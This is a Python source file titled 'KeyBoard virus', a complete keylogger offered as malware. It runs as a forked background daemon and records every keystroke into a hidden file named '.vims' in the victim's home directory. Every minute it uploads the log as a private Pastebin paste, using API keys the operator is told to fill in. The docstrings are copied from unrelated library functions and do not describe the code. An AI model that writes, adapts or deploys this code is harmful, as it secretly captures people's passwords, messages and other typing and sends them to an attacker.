##################
# KeyBoard virus #                
##################

from time import time, sleep
from string import ascii_letters, digits, printable
from requests import post
from keyboard import read_key
from os import environ, fork, _exit, EX_OK, path
from sys import implementation

class Daemon:
    def daemon(func):
        def wrapper(*args, **kwargs):
            if fork(): return
            func(*args, **kwargs)
            _exit(EX_OK)
        return wrapper



class SendData(object):
    def __init__(self):
        self.api         = 'Your api dev key in ==> https://pastebin.com/api' # <==== edite here
        self.PastebinAPI = 'https://pastebin.com/api/api_post.php'

    
    def Send(self, data):
        """
        Sends a POST request.

        :param url: URL for the new 
        :class:Request object. 
        :param data: (optional) Dictionary, list of tuples, bytes, or file-like
        """
        try:
            
            Infromation_Past = {
                'api_option': 'paste',
                'api_dev_key': self.api,
                'api_paste_code': data,
                'api_user_key': 'Your api user key', # <==== edite here
                'api_paste_name': implementation._multiarch,
                'api_paste_format': 'text',
                'api_paste_private': 2,
                'api_paste_expire_date': 'N'
            }
            
            post(self.PastebinAPI, Infromation_Past)
        except Exception as e:
            return None
        


class ReadKeyboard(object):
    def __init__(self):
        self.word   = str()
        self.stime  = time()
        self.string = lambda: [i for i in ascii_letters + digits + printable]
        self.Post   = SendData()
        self.pathf  =  path.join(environ.get("HOME"),'.vims')
    

    def Time(self):
        """
        Return the current time in seconds
        since the Epoch.
        Fractions of a second may be present
        if the system clock provides them.
        """
        try:
            open(self.pathf, 'a').write(self.word)
            if int(time() - self.stime) >= (60):
                data = open(self.pathf, 'r').read()
                self.stime = time()
                self.Post.Send(data)

            self.word = str()
        except Exception as e:
            pass


    @Daemon.daemon
    def Listen(self):
        """
        Blocks until a keyboard event happens,
        then returns that event's name or,
        if missing, its scan code.
        """
        while True:
            sleep(0.12)
            data = read_key(suppress=True)
            self.Filtering(data)


    def Filtering(self, data):
        """Filter data Keybord"""
        if data in self.string(): self.Geting(data)
        elif data == 'space': self.Geting(' ')
        elif data == 'backspace':
            try: self.word = self.word.replace(self.word[-1], '')
            except IndexError: pass
        

    def Geting(self, data):
        self.word += data
        self.Time()
    


if __name__ == "__main__":
    re = ReadKeyboard()
    re.Listen()
